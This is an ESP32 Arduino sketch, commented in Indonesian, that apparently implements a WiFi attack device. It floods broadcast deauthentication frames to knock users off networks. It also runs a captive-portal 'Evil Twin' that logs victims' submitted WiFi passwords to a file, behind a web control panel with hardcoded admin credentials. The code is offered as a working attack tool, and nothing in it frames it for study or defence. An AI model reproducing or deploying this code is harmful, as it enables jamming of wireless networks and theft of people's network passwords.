#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <LittleFS.h>
#include <DNSServer.h>
#include <esp_wifi.h>

// --- KONFIGURASI ADMIN ---
String admin_ssid = "GMpro";
String admin_pass = "Sangkur87";
String target_ssid = "";
int target_ch = 1;
bool deauth_running = false;

AsyncWebServer server(80);
DNSServer dnsServer;

// --- FUNGSI KIRIM PAKET DEAUTH ---
void sendDeauth() {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver: Broadcast
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, // Source: Fake AP
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, // BSSID
    0x00, 0x00, 0x01, 0x00
  };
  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}

void setup() {
  Serial.begin(115200);
  if(!LittleFS.begin(true)) return;

  // Mode AP + STA (Bisa scan sambil buka web)
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
  dnsServer.start(53, "*", WiFi.softAPIP());

  // --- ROUTING WEB UI ---
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/index.html", "text/html");
  });

  // Action: Scan WiFi
  server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request){
    int n = WiFi.scanNetworks();
    String json = "[";
    for (int i = 0; i < n; ++i) {
      json += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+",\"r\":"+String(WiFi.RSSI(i))+"}";
      if (i < n - 1) json += ",";
    }
    json += "]";
    request->send(200, "application/json", json);
  });

  // Action: Control Attack
  server.on("/attack", HTTP_GET, [](AsyncWebServerRequest *request){
    if(request->hasParam("type")) {
      String type = request->getParam("type")->value();
      if(type == "deauth") deauth_running = !deauth_running;
    }
    request->send(200, "text/plain", deauth_running ? "ON" : "OFF");
  });

  // Action: Save Password (Evil Twin)
  server.on("/save", HTTP_POST, [](AsyncWebServerRequest *request){
    if(request->hasParam("p", true)) {
      String p = request->getParam("p", true)->value();
      File f = LittleFS.open("/log.txt", FILE_APPEND);
      f.println("Target Pass: " + p);
      f.close();
    }
    request->send(200, "text/html", "<h2>System Updated</h2>");
  });

  // File Manager: Upload
  server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request){
    request->send(200);
  }, [](AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final){
    if(!index) request->_tempFile = LittleFS.open("/" + filename, "w");
    if(request->_tempFile.write(data, len) != len){}
    if(final) request->_tempFile.close();
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  if (deauth_running) {
    sendDeauth();
    delay(10); // Menyesuaikan kecepatan flood
  }
}
